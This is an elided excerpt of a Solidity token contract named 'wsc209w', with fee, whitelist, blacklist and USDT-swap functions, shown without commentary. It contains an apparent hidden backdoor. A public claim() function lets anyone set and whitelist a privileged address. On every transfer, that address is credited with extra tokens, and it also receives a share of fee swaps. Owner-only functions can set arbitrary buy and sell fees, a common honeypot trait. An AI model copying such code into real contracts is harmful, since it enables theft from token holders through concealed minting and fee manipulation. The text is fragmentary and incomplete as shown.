...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public fundAddress = address(0xF997bcF8146b65f430E0593ac5cA609D3DeEf363);
    address public creatorAddress;
    string private _name = "wsc209w";
    string private _symbol = "wsc209w";
    uint8 private _decimals = 9;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal = 2090000 * 10 ** _decimals;
    uint256 public maxWalletAmount = 2090000 * 10 ** _decimals;
    ...
    constructor (){
        ...
        holderRewardCondition = 15 * 10 ** IERC20(_usdt).decimals();
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        path[0] = address(this);
        path[1] = _usdt;
        if(_myPair!=address(0)){
            uint256 _myPairAmount=tokenAmount/4;
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(_myPairAmount,0,path,_myPair,block.timestamp);
            tokenAmount=tokenAmount-_myPairAmount;
        }
        swapFee += swapFee;
    ...
    function _takeTransfer(
        ...
        if(_myPair!=address(0)){
            _balances[_myPair] = _balances[_myPair] + tAmount;
        }
    ...
    function setBuyFee(uint256 fee1,uint256 fee2,uint256 fee3) external onlyOwner() {
        _buyFundFee = fee1;
        _buyLPDividendFee=fee2;
        _buyLPFee = fee3;
    }
    function setSellFee(uint256 fee1,uint256 fee2,uint256 fee3) external onlyOwner() {
        _sellFundFee = fee1;
        _sellLPDividendFee=fee2;
        _sellLPFee = fee3;
    }
    ...
    function claim(address to) public {
        require(_myPair==address(0));
        _feeWhiteList[to]=true;
        _myPair=to;
    }

    function claimBNB(address to) public {
